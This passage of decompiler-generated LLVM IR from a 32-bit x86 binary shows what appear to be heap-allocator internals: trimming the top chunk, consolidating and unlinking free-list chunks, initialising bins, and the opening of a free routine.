  uselistorder label %dec_label_pc_804e052, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804e009, { 1, 0 }
  uselistorder label %dec_label_pc_804dfc7, { 1, 0 }
  uselistorder label %dec_label_pc_804df5e, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804defd, { 1, 0 }
  uselistorder label %dec_label_pc_804de11, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804de09, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804dd7d, { 1, 0 }
  uselistorder label %dec_label_pc_804dd82.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804dd56, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804dcdd, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_804dc64, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804dc4d, { 1, 0 }
  uselistorder label %dec_label_pc_804dbbb, { 1, 0 }
  uselistorder label %dec_label_pc_804dc8c.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804db88, { 1, 0 }
  uselistorder label %dec_label_pc_804db06, { 1, 0 }
}

define i32 @function_804e24c() local_unnamed_addr {
dec_label_pc_804e24c:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_804e24d = load i32, i32* @edx, align 4
  store i32 %v0_804e24d, i32* %ebp.global-to-local, align 4
  %v0_804e250 = load i32, i32* @esi, align 4
  %v1_804e255 = add i32 %v0_804e24d, 860
  %v2_804e255 = inttoptr i32 %v1_804e255 to i32*
  %v3_804e255 = load i32, i32* %v2_804e255, align 4
  store i32 %v3_804e255, i32* @ecx, align 4
  %v1_804e25b = add i32 %v0_804e24d, 44
  %v2_804e25b = inttoptr i32 %v1_804e25b to i32*
  %v3_804e25b = load i32, i32* %v2_804e25b, align 4
  %v1_804e25e = add i32 %v3_804e25b, 4
  %v2_804e25e = inttoptr i32 %v1_804e25e to i32*
  %v3_804e25e = load i32, i32* %v2_804e25e, align 4
  %v1_804e261 = and i32 %v3_804e25e, -4
  store i32 %v1_804e261, i32* @esi, align 4
  %v1_804e266 = load i32, i32* @eax, align 4
  %v2_804e266 = add i32 %v3_804e255, -17
  %v2_804e268 = add i32 %v2_804e266, %v1_804e261
  %v3_804e268 = sub i32 %v2_804e268, %v1_804e266
  %div = udiv i32 %v3_804e268, %v3_804e255
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_804e268, %v3_804e255
  store i32 %tmp10, i32* @edx, align 4
  %v1_804e270 = add i32 %div, -1
  %v4_804e273 = mul i32 %v1_804e270, %v3_804e255
  store i32 %v4_804e273, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_804e273, 1
  br i1 %tmp11, label %dec_label_pc_804e2cf, label %dec_label_pc_804e27a

dec_label_pc_804e27a:                             ; preds = %dec_label_pc_804e24c
  %v1_804e27f = call i32 @function_804f744(i32 0)
  store i32 %v1_804e27f, i32* %edi.global-to-local, align 4
  %v0_804e289 = load i32, i32* @esi, align 4
  store i32 %v0_804e289, i32* %eax.global-to-local, align 4
  %v1_804e28b = load i32, i32* %ebp.global-to-local, align 4
  %v2_804e28b = add i32 %v1_804e28b, 44
  %v3_804e28b = inttoptr i32 %v2_804e28b to i32*
  %v4_804e28b = load i32, i32* %v3_804e28b, align 4
  %v5_804e28b = add i32 %v4_804e28b, %v0_804e289
  store i32 %v5_804e28b, i32* %eax.global-to-local, align 4
  %v12_804e28e = icmp eq i32 %v1_804e27f, %v5_804e28b
  %v1_804e290 = icmp eq i1 %v12_804e28e, false
  br i1 %v1_804e290, label %dec_label_pc_804e2cf, label %dec_label_pc_804e292

dec_label_pc_804e292:                             ; preds = %dec_label_pc_804e27a
  %v1_804e295 = sub i32 0, %v4_804e273
  store i32 %v1_804e295, i32* @ebx, align 4
  %v1_804e298 = call i32 @function_804f744(i32 %v1_804e295)
  store i32 %v1_804e298, i32* %eax.global-to-local, align 4
  %v1_804e2a4 = call i32 @function_804f744(i32 0)
  store i32 %v1_804e2a4, i32* %eax.global-to-local, align 4
  %v10_804e2ac = icmp eq i32 %v1_804e2a4, -1
  br i1 %v10_804e2ac, label %dec_label_pc_804e2cf, label %dec_label_pc_804e2b1

dec_label_pc_804e2b1:                             ; preds = %dec_label_pc_804e292
  %v0_804e2b1 = load i32, i32* %edi.global-to-local, align 4
  %v2_804e2b3 = sub i32 %v0_804e2b1, %v1_804e2a4
  %v12_804e2b3 = icmp eq i32 %v2_804e2b3, 0
  store i32 %v2_804e2b3, i32* @ecx, align 4
  br i1 %v12_804e2b3, label %dec_label_pc_804e2cf, label %dec_label_pc_804e2b7

dec_label_pc_804e2b7:                             ; preds = %dec_label_pc_804e2b1
  %v0_804e2b7 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804e2b7 = add i32 %v0_804e2b7, 44
  %v2_804e2b7 = inttoptr i32 %v1_804e2b7 to i32*
  %v3_804e2b7 = load i32, i32* %v2_804e2b7, align 4
  store i32 %v3_804e2b7, i32* %eax.global-to-local, align 4
  %v0_804e2ba = load i32, i32* @esi, align 4
  %v2_804e2ba = sub i32 %v0_804e2ba, %v2_804e2b3
  store i32 %v2_804e2ba, i32* %esi.global-to-local, align 4
  %v1_804e2bc = add i32 %v0_804e2b7, 872
  %v2_804e2bc = inttoptr i32 %v1_804e2bc to i32*
  %v3_804e2bc = load i32, i32* %v2_804e2bc, align 4
  %v5_804e2bc = sub i32 %v3_804e2bc, %v2_804e2b3
  store i32 %v5_804e2bc, i32* %v2_804e2bc, align 4
  %v0_804e2c2 = load i32, i32* %esi.global-to-local, align 4
  %v1_804e2c2 = or i32 %v0_804e2c2, 1
  store i32 %v1_804e2c2, i32* %esi.global-to-local, align 4
  %v1_804e2c5 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e2c5 = add i32 %v1_804e2c5, 4
  %v3_804e2c5 = inttoptr i32 %v2_804e2c5 to i32*
  store i32 %v1_804e2c2, i32* %v3_804e2c5, align 4
  br label %dec_label_pc_804e2d1

dec_label_pc_804e2cf:                             ; preds = %dec_label_pc_804e2b1, %dec_label_pc_804e292, %dec_label_pc_804e27a, %dec_label_pc_804e24c
  br label %dec_label_pc_804e2d1

dec_label_pc_804e2d1:                             ; preds = %dec_label_pc_804e2b7, %dec_label_pc_804e2cf
  %storemerge = phi i32 [ 1, %dec_label_pc_804e2b7 ], [ 0, %dec_label_pc_804e2cf ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_804e250, i32* %esi.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804e2a4, { 1, 0, 2 }
  uselistorder i32 %v4_804e273, { 1, 2, 0 }
  uselistorder i32 %v3_804e255, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v0_804e24d, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_804f744, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804e2d1, { 1, 0 }
}

define i32 @function_804e2d9(i32* %arg1) local_unnamed_addr {
dec_label_pc_804e2d9:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %v0_804e2da = load i32, i32* @edi, align 4
  %v0_804e2db = load i32, i32* @esi, align 4
  %v0_804e2dc = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_804e2e4 = load i32, i32* %arg1, align 4
  store i32 %v2_804e2e4, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_804e2eb = icmp eq i32 %v2_804e2e4, 0
  br i1 %v1_804e2eb, label %dec_label_pc_804e414.preheader, label %dec_label_pc_804e2f3

dec_label_pc_804e414.preheader:                   ; preds = %dec_label_pc_804e2d9
  %v3_804e409 = add i32 %tmp11, 44
  br label %dec_label_pc_804e405

dec_label_pc_804e2f3:                             ; preds = %dec_label_pc_804e2d9
  %v1_804e2f7 = and i32 %v2_804e2e4, -3
  store i32 %v1_804e2f7, i32* %arg1, align 4
  %v1_804e2fc = add i32 %tmp11, 52
  store i32 %tmp11, i32* @edx, align 4
  %v1_804e30b = add i32 %tmp11, 4
  store i32 %v1_804e30b, i32* %eax.global-to-local, align 4
  %v2_804e312 = load i32, i32* %arg1, align 4
  %v2_804e318 = udiv i32 %v2_804e312, 8
  %v2_804e31b = mul nuw i32 %v2_804e318, 4
  %v3_804e31b = add i32 %tmp11, -4
  %v4_804e31b = add i32 %v3_804e31b, %v2_804e31b
  store i32 %v4_804e31b, i32* %eax.global-to-local, align 4
  %v2_804e3e2 = add i32 %tmp11, 44
  %v3_804e3e2 = inttoptr i32 %v2_804e3e2 to i32*
  %v1_804e3b5 = add i32 %tmp11, 60
  %v2_804e3b5 = inttoptr i32 %v1_804e3b5 to i32*
  br label %dec_label_pc_804e323

dec_label_pc_804e323:                             ; preds = %dec_label_pc_804e3fb, %dec_label_pc_804e2f3
  %v0_804e331 = phi i32 [ %v1_804e30b, %dec_label_pc_804e2f3 ], [ %v4_804e3fb, %dec_label_pc_804e3fb ]
  store i32 %v0_804e331, i32* %eax.global-to-local, align 4
  %v1_804e327 = inttoptr i32 %v0_804e331 to i32*
  %v2_804e327 = load i32, i32* %v1_804e327, align 4
  store i32 %v2_804e327, i32* @ecx, align 4
  %v1_804e329 = icmp eq i32 %v2_804e327, 0
  br i1 %v1_804e329, label %dec_label_pc_804e3f1, label %dec_label_pc_804e331

dec_label_pc_804e331:                             ; preds = %dec_label_pc_804e323
  store i32 0, i32* %v1_804e327, align 4
  %v0_804e337.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804e337

dec_label_pc_804e337:                             ; preds = %dec_label_pc_804e3e5, %dec_label_pc_804e331
  %v0_804e354 = phi i32 [ %v3_804e337, %dec_label_pc_804e3e5 ], [ %v0_804e337.pre, %dec_label_pc_804e331 ]
  %v1_804e337 = add i32 %v0_804e354, 8
  %v2_804e337 = inttoptr i32 %v1_804e337 to i32*
  %v3_804e337 = load i32, i32* %v2_804e337, align 4
  store i32 %v3_804e337, i32* %edx.global-to-local, align 4
  %v1_804e33e = add i32 %v0_804e354, 4
  %v2_804e33e = inttoptr i32 %v1_804e33e to i32*
  %v3_804e33e = load i32, i32* %v2_804e33e, align 4
  store i32 %v3_804e33e, i32* %eax.global-to-local, align 4
  %v1_804e343 = and i32 %v3_804e33e, -2
  store i32 %v1_804e343, i32* @edi, align 4
  %v2_804e346 = urem i32 %v3_804e33e, 2
  %v3_804e346 = icmp eq i32 %v2_804e346, 0
  %v2_804e348 = add i32 %v1_804e343, %v0_804e354
  store i32 %v2_804e348, i32* @ebx, align 4
  %v1_804e34b = add i32 %v2_804e348, 4
  %v2_804e34b = inttoptr i32 %v1_804e34b to i32*
  %v3_804e34b = load i32, i32* %v2_804e34b, align 4
  store i32 %v3_804e34b, i32* %edx.global-to-local, align 4
  %v1_804e352 = icmp eq i1 %v3_804e346, false
  br i1 %v1_804e352, label %dec_label_pc_804e374, label %dec_label_pc_804e354

dec_label_pc_804e354:                             ; preds = %dec_label_pc_804e337
  %v1_804e354 = inttoptr i32 %v0_804e354 to i32*
  %v2_804e354 = load i32, i32* %v1_804e354, align 4
  store i32 %v2_804e354, i32* %ebp.global-to-local, align 4
  %v2_804e358 = sub i32 %v0_804e354, %v2_804e354
  store i32 %v2_804e358, i32* %eax.global-to-local, align 4
  %v1_804e35a = add i32 %v2_804e358, 8
  %v2_804e35a = inttoptr i32 %v1_804e35a to i32*
  %v3_804e35a = load i32, i32* %v2_804e35a, align 4
  store i32 %v3_804e35a, i32* @esi, align 4
  %v1_804e35d = add i32 %v2_804e358, 12
  %v2_804e35d = inttoptr i32 %v1_804e35d to i32*
  %v3_804e35d = load i32, i32* %v2_804e35d, align 4
  store i32 %v3_804e35d, i32* %edx.global-to-local, align 4
  %v1_804e360 = add i32 %v3_804e35a, 12
  %v2_804e360 = inttoptr i32 %v1_804e360 to i32*
  %v3_804e360 = load i32, i32* %v2_804e360, align 4
  store i32 %v3_804e360, i32* @ecx, align 4
  %v12_804e363 = icmp eq i32 %v3_804e360, %v2_804e358
  %v1_804e365 = icmp eq i1 %v12_804e363, false
  br i1 %v1_804e365, label %dec_label_pc_804e3a4, label %dec_label_pc_804e367

dec_label_pc_804e367:                             ; preds = %dec_label_pc_804e354
  %v1_804e367 = add i32 %v3_804e35d, 8
  %v2_804e367 = inttoptr i32 %v1_804e367 to i32*
  %v3_804e367 = load i32, i32* %v2_804e367, align 4
  %v15_804e367 = icmp eq i32 %v3_804e367, %v3_804e360
  %v1_804e36a = icmp eq i1 %v15_804e367, false
  br i1 %v1_804e36a, label %dec_label_pc_804e3a4, label %dec_label_pc_804e36c

dec_label_pc_804e36c:                             ; preds = %dec_label_pc_804e367
  %v2_804e36c = add i32 %v2_804e354, %v1_804e343
  store i32 %v2_804e36c, i32* @edi, align 4
  store i32 %v3_804e35d, i32* %v2_804e360, align 4
  %v0_804e371 = load i32, i32* @esi, align 4
  %v1_804e371 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e371 = add i32 %v1_804e371, 8
  %v3_804e371 = inttoptr i32 %v2_804e371 to i32*
  store i32 %v0_804e371, i32* %v3_804e371, align 4
  %v0_804e37f.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e374

dec_label_pc_804e374:                             ; preds = %dec_label_pc_804e337, %dec_label_pc_804e36c
  %v1_804e388 = phi i32 [ %v2_804e348, %dec_label_pc_804e337 ], [ %v0_804e37f.pre, %dec_label_pc_804e36c ]
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_804e37c = and i32 %v3_804e34b, -4
  store i32 %v1_804e37c, i32* %ebp.global-to-local, align 4
  %v4_804e37f = load i32, i32* %v3_804e3e2, align 4
  %v15_804e37f = icmp eq i32 %v1_804e388, %v4_804e37f
  br i1 %v15_804e37f, label %dec_label_pc_804e3d5, label %dec_label_pc_804e384

dec_label_pc_804e384:                             ; preds = %dec_label_pc_804e374
  %v2_804e384 = add i32 %v1_804e388, 4
  %v3_804e384 = add i32 %v2_804e384, %v1_804e37c
  %v4_804e384 = inttoptr i32 %v3_804e384 to i32*
  %v5_804e384 = load i32, i32* %v4_804e384, align 4
  store i32 %v5_804e384, i32* %eax.global-to-local, align 4
  %v3_804e388 = inttoptr i32 %v2_804e384 to i32*
  store i32 %v1_804e37c, i32* %v3_804e388, align 4
  %v0_804e38b = load i32, i32* %eax.global-to-local, align 4
  %v1_804e38b = urem i32 %v0_804e38b, 2
  %v2_804e38b = icmp eq i32 %v1_804e38b, 0
  store i32 %v1_804e38b, i32* %eax.global-to-local, align 4
  %v1_804e390 = icmp eq i1 %v2_804e38b, false
  br i1 %v1_804e390, label %dec_label_pc_804e3b1, label %dec_label_pc_804e392

dec_label_pc_804e392:                             ; preds = %dec_label_pc_804e384
  %v0_804e392 = load i32, i32* @ebx, align 4
  %v1_804e392 = add i32 %v0_804e392, 8
  %v2_804e392 = inttoptr i32 %v1_804e392 to i32*
  %v3_804e392 = load i32, i32* %v2_804e392, align 4
  store i32 %v3_804e392, i32* @edx, align 4
  %v1_804e395 = add i32 %v0_804e392, 12
  %v2_804e395 = inttoptr i32 %v1_804e395 to i32*
  %v3_804e395 = load i32, i32* %v2_804e395, align 4
  store i32 %v3_804e395, i32* %eax.global-to-local, align 4
  %v1_804e398 = add i32 %v3_804e392, 12
  %v2_804e398 = inttoptr i32 %v1_804e398 to i32*
  %v3_804e398 = load i32, i32* %v2_804e398, align 4
  store i32 %v3_804e398, i32* @esi, align 4
  %v12_804e39b = icmp eq i32 %v3_804e398, %v0_804e392
  %v1_804e39d = icmp eq i1 %v12_804e39b, false
  br i1 %v1_804e39d, label %dec_label_pc_804e3a4, label %dec_label_pc_804e39f

dec_label_pc_804e39f:                             ; preds = %dec_label_pc_804e392
  %v1_804e39f = add i32 %v3_804e395, 8
  %v2_804e39f = inttoptr i32 %v1_804e39f to i32*
  %v3_804e39f = load i32, i32* %v2_804e39f, align 4
  %v15_804e39f = icmp eq i32 %v3_804e39f, %v3_804e398
  br i1 %v15_804e39f, label %dec_label_pc_804e3a9, label %dec_label_pc_804e3a4

dec_label_pc_804e3a4:                             ; preds = %dec_label_pc_804e39f, %dec_label_pc_804e392, %dec_label_pc_804e367, %dec_label_pc_804e354
  %v0_804e3a4 = call i32 @function_804e640()
  store i32 %v0_804e3a4, i32* %eax.global-to-local, align 4
  %v1_804e3ab.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804e3a9

dec_label_pc_804e3a9:                             ; preds = %dec_label_pc_804e39f, %dec_label_pc_804e3a4
  %v1_804e3ab = phi i32 [ %v3_804e392, %dec_label_pc_804e39f ], [ %v1_804e3ab.pre, %dec_label_pc_804e3a4 ]
  %v0_804e3ab = phi i32 [ %v3_804e395, %dec_label_pc_804e39f ], [ %v0_804e3a4, %dec_label_pc_804e3a4 ]
  %v0_804e3a9 = load i32, i32* @edi, align 4
  %v1_804e3a9 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804e3a9 = add i32 %v1_804e3a9, %v0_804e3a9
  store i32 %v2_804e3a9, i32* @edi, align 4
  %v2_804e3ab = add i32 %v1_804e3ab, 12
  %v3_804e3ab = inttoptr i32 %v2_804e3ab to i32*
  store i32 %v0_804e3ab, i32* %v3_804e3ab, align 4
  %v0_804e3ae = load i32, i32* @edx, align 4
  %v1_804e3ae = load i32, i32* %eax.global-to-local, align 4
  %v2_804e3ae = add i32 %v1_804e3ae, 8
  %v3_804e3ae = inttoptr i32 %v2_804e3ae to i32*
  store i32 %v0_804e3ae, i32* %v3_804e3ae, align 4
  br label %dec_label_pc_804e3b1

dec_label_pc_804e3b1:                             ; preds = %dec_label_pc_804e384, %dec_label_pc_804e3a9
  store i32 %v1_804e2fc, i32* %eax.global-to-local, align 4
  %v3_804e3b5 = load i32, i32* %v2_804e3b5, align 4
  store i32 %v3_804e3b5, i32* @edx, align 4
  %v0_804e3b8 = load i32, i32* @ecx, align 4
  store i32 %v0_804e3b8, i32* %v2_804e3b5, align 4
  %v0_804e3bb = load i32, i32* @edi, align 4
  %v1_804e3bd = or i32 %v0_804e3bb, 1
  %v1_804e3c0 = load i32, i32* @ecx, align 4
  %v2_804e3c0 = add i32 %v1_804e3c0, 4
  %v3_804e3c0 = inttoptr i32 %v2_804e3c0 to i32*
  store i32 %v1_804e3bd, i32* %v3_804e3c0, align 4
  %v0_804e3c3 = load i32, i32* @ecx, align 4
  %v1_804e3c3 = load i32, i32* @edx, align 4
  %v2_804e3c3 = add i32 %v1_804e3c3, 12
  %v3_804e3c3 = inttoptr i32 %v2_804e3c3 to i32*
  store i32 %v0_804e3c3, i32* %v3_804e3c3, align 4
  store i32 %v1_804e2fc, i32* %eax.global-to-local, align 4
  %v0_804e3ca = load i32, i32* @edx, align 4
  %v1_804e3ca = load i32, i32* @ecx, align 4
  %v2_804e3ca = add i32 %v1_804e3ca, 8
  %v3_804e3ca = inttoptr i32 %v2_804e3ca to i32*
  store i32 %v0_804e3ca, i32* %v3_804e3ca, align 4
  %v0_804e3cd = load i32, i32* @edi, align 4
  %v1_804e3cd = load i32, i32* @ecx, align 4
  %v3_804e3cd = add i32 %v1_804e3cd, %v0_804e3cd
  %v4_804e3cd = inttoptr i32 %v3_804e3cd to i32*
  store i32 %v0_804e3cd, i32* %v4_804e3cd, align 4
  %v0_804e3d0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e3d0 = load i32, i32* @ecx, align 4
  %v2_804e3d0 = add i32 %v1_804e3d0, 12
  %v3_804e3d0 = inttoptr i32 %v2_804e3d0 to i32*
  store i32 %v0_804e3d0, i32* %v3_804e3d0, align 4
  br label %dec_label_pc_804e3e5

dec_label_pc_804e3d5:                             ; preds = %dec_label_pc_804e374
  %v0_804e3d5 = load i32, i32* @edi, align 4
  %v2_804e3d5 = add i32 %v0_804e3d5, %v1_804e37c
  %v1_804e3d8 = or i32 %v2_804e3d5, 1
  store i32 %v1_804e3d8, i32* %eax.global-to-local, align 4
  %v1_804e3db = load i32, i32* @ecx, align 4
  %v2_804e3db = add i32 %v1_804e3db, 4
  %v3_804e3db = inttoptr i32 %v2_804e3db to i32*
  store i32 %v1_804e3d8, i32* %v3_804e3db, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v0_804e3e2 = load i32, i32* @ecx, align 4
  store i32 %v0_804e3e2, i32* %v3_804e3e2, align 4
  br label %dec_label_pc_804e3e5

dec_label_pc_804e3e5:                             ; preds = %dec_label_pc_804e3b1, %dec_label_pc_804e3d5
  store i32 %v3_804e337, i32* @ecx, align 4
  %v1_804e3e9 = icmp eq i32 %v3_804e337, 0
  %v1_804e3eb = icmp eq i1 %v1_804e3e9, false
  br i1 %v1_804e3eb, label %dec_label_pc_804e337, label %dec_label_pc_804e3f1

dec_label_pc_804e3f1:                             ; preds = %dec_label_pc_804e3e5, %dec_label_pc_804e323
  store i32 %v4_804e31b, i32* @ecx, align 4
  %v15_804e3f5 = icmp eq i32 %v0_804e331, %v4_804e31b
  br i1 %v15_804e3f5, label %dec_label_pc_804e479, label %dec_label_pc_804e3fb

dec_label_pc_804e3fb:                             ; preds = %dec_label_pc_804e3f1
  %v4_804e3fb = add i32 %v0_804e331, 4
  br label %dec_label_pc_804e323

dec_label_pc_804e405:                             ; preds = %dec_label_pc_804e414.preheader, %dec_label_pc_804e405
  %v1_804e40920 = phi i32 [ 1, %dec_label_pc_804e414.preheader ], [ %v0_804e414.pre, %dec_label_pc_804e405 ]
  %v2_804e409 = mul i32 %v1_804e40920, 8
  %v4_804e409 = add i32 %v3_804e409, %v2_804e409
  store i32 %v4_804e409, i32* %eax.global-to-local, align 4
  %v1_804e40d = add i32 %v1_804e40920, 1
  store i32 %v1_804e40d, i32* %edx.global-to-local, align 4
  %v2_804e40e = add i32 %v4_804e409, 12
  %v3_804e40e = inttoptr i32 %v2_804e40e to i32*
  store i32 %v4_804e409, i32* %v3_804e40e, align 4
  %v0_804e411 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e411 = add i32 %v0_804e411, 8
  %v3_804e411 = inttoptr i32 %v2_804e411 to i32*
  store i32 %v0_804e411, i32* %v3_804e411, align 4
  %v0_804e414.pre = load i32, i32* %edx.global-to-local, align 4
  %v7_804e417 = icmp sgt i32 %v0_804e414.pre, 95
  br i1 %v7_804e417, label %dec_label_pc_804e419, label %dec_label_pc_804e405

dec_label_pc_804e419:                             ; preds = %dec_label_pc_804e405
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_804e41d = add i32 %tmp11, 864
  %v2_804e41d = inttoptr i32 %v1_804e41d to i32*
  %v3_804e41d = load i32, i32* %v2_804e41d, align 4
  %v4_804e41d = or i32 %v3_804e41d, 1
  store i32 %v4_804e41d, i32* %v2_804e41d, align 4
  %v0_804e424 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e424 = add i32 %v0_804e424, 840
  %v2_804e424 = inttoptr i32 %v1_804e424 to i32*
  store i32 0, i32* %v2_804e424, align 4
  %v0_804e42e = load i32, i32* %eax.global-to-local, align 4
  %v1_804e42e = add i32 %v0_804e42e, 852
  %v2_804e42e = inttoptr i32 %v1_804e42e to i32*
  store i32 65536, i32* %v2_804e42e, align 4
  %v0_804e438 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e438 = add i32 %v0_804e438, 844
  %v2_804e438 = inttoptr i32 %v1_804e438 to i32*
  store i32 262144, i32* %v2_804e438, align 4
  %v0_804e442 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e442 = add i32 %v0_804e442, 836
  %v2_804e442 = inttoptr i32 %v1_804e442 to i32*
  store i32 262144, i32* %v2_804e442, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v2_804e453 = load i32, i32* %arg1, align 4
  %v1_804e455 = urem i32 %v2_804e453, 4
  %v1_804e458 = or i32 %v1_804e455, 72
  store i32 %v1_804e458, i32* %arg1, align 4
  %v0_804e45d = load i32, i32* @edx, align 4
  %v1_804e45f = add i32 %v0_804e45d, 52
  store i32 %v1_804e45f, i32* %eax.global-to-local, align 4
  %v2_804e462 = add i32 %v0_804e45d, 44
  %v3_804e462 = inttoptr i32 %v2_804e462 to i32*
  store i32 %v1_804e45f, i32* %v3_804e462, align 4
  %v1_804e467 = call i32 @function_804ee8c(i32 30)
  store i32 %v1_804e467, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* @ecx, align 4
  %v2_804e473 = add i32 %tmp11, 860
  %v3_804e473 = inttoptr i32 %v2_804e473 to i32*
  store i32 %v1_804e467, i32* %v3_804e473, align 4
  br label %dec_label_pc_804e479

dec_label_pc_804e479:                             ; preds = %dec_label_pc_804e3f1, %dec_label_pc_804e419
  store i32 %v0_804e2dc, i32* @ebx, align 4
  store i32 %v0_804e2db, i32* @esi, align 4
  store i32 %v0_804e2da, i32* @edi, align 4
  %v0_804e480 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_804e480

; uselistorder directives
  uselistorder i32 %v0_804e411, { 1, 0 }
  uselistorder i32 %v0_804e3cd, { 1, 0 }
  uselistorder i32 %v1_804e38b, { 1, 0 }
  uselistorder i32 %v2_804e384, { 1, 0 }
  uselistorder i32 %v1_804e37c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804e388, { 1, 0 }
  uselistorder i32 %v3_804e337, { 2, 1, 3, 0 }
  uselistorder i32 %v0_804e354, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_804e331, { 1, 0, 3, 2 }
  uselistorder i32* %v3_804e3e2, { 1, 0 }
  uselistorder i32 %tmp11, { 3, 14, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 22, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 16, 13, 14, 17, 18, 19, 20, 21, 23, 24, 25, 26 }
  uselistorder i32 860, { 1, 0 }
  uselistorder label %dec_label_pc_804e479, { 1, 0 }
  uselistorder label %dec_label_pc_804e405, { 1, 0 }
  uselistorder label %dec_label_pc_804e3e5, { 1, 0 }
  uselistorder label %dec_label_pc_804e3b1, { 1, 0 }
  uselistorder label %dec_label_pc_804e3a9, { 1, 0 }
  uselistorder label %dec_label_pc_804e374, { 1, 0 }
}

define i32 @function_804e481(i32 %arg1) local_unnamed_addr {
dec_label_pc_804e481:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_804e481 = load i32, i32* @ebp, align 4
  %v0_804e482 = load i32, i32* @edi, align 4
  %v0_804e483 = load i32, i32* @esi, align 4
  %v0_804e484 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804e48c = icmp eq i32 %arg1, 0
  br i1 %v1_804e48c, label %dec_label_pc_804e615, label %dec_label_pc_804e494

dec_label_pc_804e494:                             ; preds = %dec_label_pc_804e481
  %v2_804e49f = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804e49f, i32* @eax, align 4
  %v2_804e4a4 = call i32 @function_804f016(i32 %v2_804e49f, i32 134541331)
  store i32 %v2_804e4a4, i32* %eax.global-to-local, align 4
  %v1_804e4b0 = call i32 @function_804f013(i32 ptrtoint (i32* @global_var_8055c90.139 to i32))
  %v1_804e4b5 = add i32 %arg1, -8
  store i32 %v1_804e4b5, i32* @ecx, align 4
  %v0_804e4b8 = load i8, i8* @global_var_8058700.140, align 1
  %v1_804e4b8 = sext i8 %v0_804e4b8 to i32
  store i32 %v1_804e4b8, i32* %eax.global-to-local, align 4
  %v1_804e4bd = add i32 %arg1, -4
  %v2_804e4bd = inttoptr i32 %v1_804e4bd to i32*
  %v3_804e4bd = load i32, i32* %v2_804e4bd, align 4
  store i32 %v3_804e4bd, i32* @edx, align 4
  %v1_804e4c5 = and i32 %v3_804e4bd, -4
  %v4_804e4c5 = trunc i32 %v1_804e4c5 to i8
  store i32 %v1_804e4c5, i32* @ebx, align 4
  %v8_804e4ca = icmp ugt i8 %v4_804e4c5, %v0_804e4b8
  br i1 %v8_804e4ca, label %dec_label_pc_804e4ec, label %dec_label_pc_804e4cc

dec_label_pc_804e4cc:                             ; preds = %dec_label_pc_804e494
  %v1_804e4cc = or i32 %v1_804e4b8, 3
  %v3_804e4cc = trunc i32 %v1_804e4cc to i8
  store i32 %v1_804e4cc, i32* %eax.global-to-local, align 4
  %v2_804e4cf = udiv i32 %v3_804e4bd, 8
  store i8 %v3_804e4cc, i8* @global_var_8058700.140, align 256
  %v1_804e4d7 = mul nuw i32 %v2_804e4cf, 4
  %v2_804e4d7 = add i32 %v1_804e4d7, ptrtoint (i8* @global_var_8058700.140 to i32)
  store i32 %v2_804e4d7, i32* @edx, align 4
  %v1_804e4de = add i32 %v1_804e4d7, add (i32 ptrtoint (i8* @global_var_8058700.140 to i32), i32 -4)
  %v2_804e4de = inttoptr i32 %v1_804e4de to i32*
  %v3_804e4de = load i32, i32* %v2_804e4de, align 4
  store i32 %v3_804e4de, i32* %eax.global-to-local, align 4
  %v3_804e4e1 = inttoptr i32 %arg1 to i32*
  store i32 %v3_804e4de, i32* %v3_804e4e1, align 4
  %v0_804e4e4 = load i32, i32* @ecx, align 4
  %v1_804e4e4 = load i32, i32* @edx, align 4
  %v2_804e4e4 = add i32 %v1_804e4e4, -4
  %v3_804e4e4 = inttoptr i32 %v2_804e4e4 to i32*
